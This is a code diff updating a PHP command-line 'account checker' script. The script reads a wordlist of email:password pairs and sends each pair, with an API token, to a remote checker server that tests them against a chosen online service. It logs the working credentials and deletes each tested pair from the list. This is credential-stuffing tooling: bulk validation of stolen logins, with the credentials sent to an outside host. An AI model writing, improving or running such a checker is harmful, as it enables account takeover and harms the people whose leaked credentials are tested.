@@ -6,30 +6,33 @@ $VERSION_FILE 	= file(__DIR__."/.VERSION") or die("Unable to open file!");
 echo "
 ./ ************************************************************************************ \.
 ./ || www.fajarpunya.com
-./ || Created By FajarPunya [ 19 September 2017 ] (New Update)
+./ || Created By FajarPunya [ 21 Feb 2019 ] (New Update)
 ./ || ".$param." ACCOUNT CHECKER
-./ || BUID VERSION ".$VERSION_FILE[0]."
+./ || BUILD VERSION ".$VERSION_FILE[0]."
 ./ || Date Now : ".date('d M Y')."
 ./ ************************************************************************************ \.
 	\n";
 }
 
-function curl($email,$password,$wordlists,$section,$server_host,$delim,$username)
+function curl($email,$password,$wordlists,$section,$server_host,$delim,$api_token)
 {
-	$url = $server_host.'api/'.$section.'/process';
-	$data = "email=".$email."&pass=".$password."&security_code=".$username."&section=".$section."&delimiter=".$delim;
+	$url = $server_host.'/account-checker/process/'.$section;
+	$data = "email=".$email."&password=".$password."&api_token=".$api_token."&section=".$section."&delimiter=".$delim.'&from=cli';
 	$ch = curl_init();
 	curl_setopt_array($ch, array(
-		CURLOPT_URL 				=> $url,
- 		CURLOPT_RETURNTRANSFER 		=> 1,
-		CURLOPT_FOLLOWLOCATION		=> 1,
-		CURLOPT_VERBOSE				=> 0,
-		CURLOPT_HEADER				=> 0, #0 ? 1 : 0,
-		CURLOPT_NOBODY				=> 0, #0 ? 1 : 0,
-		CURLOPT_TIMEOUT				=> 20,
-		CURLOPT_CONNECTTIMEOUT		=> 20,
-		CURLOPT_POST				=> 1,
-		CURLOPT_POSTFIELDS			=> $data,
+		CURLOPT_URL => $url,
+ 		CURLOPT_RETURNTRANSFER => 1,
+		CURLOPT_FOLLOWLOCATION => 1,
+		CURLOPT_VERBOSE => 0,
+		CURLOPT_HEADER => 0, #0 ? 1 : 0,
+		CURLOPT_NOBODY => 0, #0 ? 1 : 0,
+		CURLOPT_TIMEOUT => 20,
+		CURLOPT_CONNECTTIMEOUT => 30,
+		CURLOPT_POST => 1,
+		CURLOPT_POSTFIELDS => $data,
+		CURLOPT_HTTPHEADER => [
+			'X-Requested-With: XMLHttpRequest'
+		]
 	));
 	$response 	= curl_exec($ch);
 	$error 		= curl_error($ch);
@@ -42,7 +45,7 @@ function curl($email,$password,$wordlists,$section,$server_host,$delim,$username
 	);
 }
 
-function _main_windos($wordlists,$section,$delim,$server_host,$username)
+function _main_windows($wordlists,$section,$delim,$server_host,$api_token)
 {
 	$db_list = file($wordlists) or die("Unable to open file wordlist!");
 	for ($i=0; $i < count($db_list);)
@@ -52,7 +55,7 @@ function _main_windos($wordlists,$section,$delim,$server_host,$username)
 		$password = str_replace(array("\n","\r"),"",$explode_acc[1]);
 		if(validate_email($email) != "")
 		{
-			$page = curl($email,$password,$wordlists,$section,$server_host,$delim,$username);
+			$page = curl($email,$password,$wordlists,$section,$server_host,$delim,$api_token);
 			if($page['code'] == 200)
 			{
 				$data = json_decode($page['response']);
@@ -61,32 +64,32 @@ function _main_windos($wordlists,$section,$delim,$server_host,$username)
 				$x = $data->status." | ".$data->email." | ".$data->password." | ".$data->msg."|".$data->label." | ".$data->datetime;
 				if($data->error == 0)
 				{
-					echo "\033[32m".$x."\n";
+					echo "\033[32m[+] ".$x."\n";
 					write_logs($section,$x,$delim);
 					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
 					$i++;
 				} elseif($data->error == 1)
 				{
-					echo "\033[34m".$x."\n";
+					echo "\033[34m[+] ".$x."\n";
 					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
 					$i++;
 				} elseif($data->error == 2)
 				{ 
-					echo "\033[31m".$x."\n";
+					echo "\033[31m[+] ".$x."\n";
 					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
 					$i++;
 				} elseif($data->error == 3)
 				{
-					echo "\033[30m".$x."\n";
+					echo "\033[30m[+] ".$x."\n";
 					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
 					$i++;
 				} else
 				{
-					echo "\033[33m".$x."\n";
+					echo "\033[33m[+] ".$x."\n";
 				}
 			} else
 			{
-				echo "\033[31m Webhost not responding.\n";
+				echo "\033[31m[+] Request is error and system will check your request again [CTRL + C to stop this process] !\n";
 			}
 
 		} else
@@ -97,7 +100,7 @@ function _main_windos($wordlists,$section,$delim,$server_host,$username)
 	}
 }
 
-function _main_linux($wordlists,$section,$delim,$server_host,$username)
+function _main_linux($wordlists,$section,$delim,$server_host,$api_token)
 {
 	$db_list = file($wordlists) or die("Unable to open file!");
 	for ($i=0; $i < count($db_list);)
@@ -107,7 +110,7 @@ function _main_linux($wordlists,$section,$delim,$server_host,$username)
 		$password = str_replace(array("\n","\r"),"",$explode_acc[1]);
 		if(validate_email($email) != "")
 		{
-			$page = curl($email,$password,$wordlists,$section,$server_host,$delim,$username);
+			$page = curl($email,$password,$wordlists,$section,$server_host,$delim,$api_token);
 			if($page['code'] == 200)
 			{
 				$data = json_decode($page['response']);
@@ -116,32 +119,32 @@ function _main_linux($wordlists,$section,$delim,$server_host,$username)
 				$x = $data->status." | ".$data->email." | ".$data->password." | ".$data->msg."|".$data->label." | ".$data->datetime;
 				if($data->error == 0)
 				{
-					echo "\033[32m".$x."\n";
+					echo "\033[32m[+] ".$x."\n";
 					write_logs($section,$x,$delim);
 					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
 					$i++;
 				} elseif($data->error == 1)
 				{
-					echo "\033[34m".$x."\n";
+					echo "\033[34m[+] ".$x."\n";
 					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
 					$i++;
 				} elseif($data->error == 2)
 				{ 
-					echo "\033[31m".$x."\n";
+					echo "\033[31m[+] ".$x."\n";
 					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
 					$i++;
 				} elseif($data->error == 3)
 				{
-					echo "\033[30m".$x."\n";
+					echo "\033[30m[+] ".$x."\n";
 					remove_text($wordlists,$explode_acc[0].$delim.$explode_acc[1]);
 					$i++;
 				} else
 				{
-					echo "\033[33m".$x."\n";
+					echo "\033[33m[+] ".$x."\n";
 				}
 			} else
 			{
-				echo "\033[31m Webhost not responding.\n";
+				echo "\033[31m[+] Request is error and system will check your request again [CTRL + C to stop this process] !\n";
 			}
 		} else
 		{
@@ -217,7 +220,7 @@ function validate_email($param)
 
 function section($x,$section,$server_host)
 {
-	$get_file 	= file_get_contents($server_host."data_api/data.json");
+	$get_file 	= file_get_contents($server_host."/services");
 	$data 		= json_decode($get_file,true);
 
 	if($x == "validate")
@@ -226,7 +229,7 @@ function section($x,$section,$server_host)
 		for($i=0; $i < count($data['res']); $i++)
 		{
 
-			if(strtolower($section) == $data['res'][$i]['url'])
+			if(strtolower($section) == $data['res'][$i]['code'])
 			{
 				return true;
 			}
@@ -239,7 +242,7 @@ function section($x,$section,$server_host)
 			$no = $i + 1;
 			if($data['res'][$i]['api'] == true )
 			{
-				echo "[+] Code : ".$data['res'][$i]['url']."\n";
+				echo "[+] Code : ".$data['res'][$i]['code']."\n";
 			}
 		}
 	}
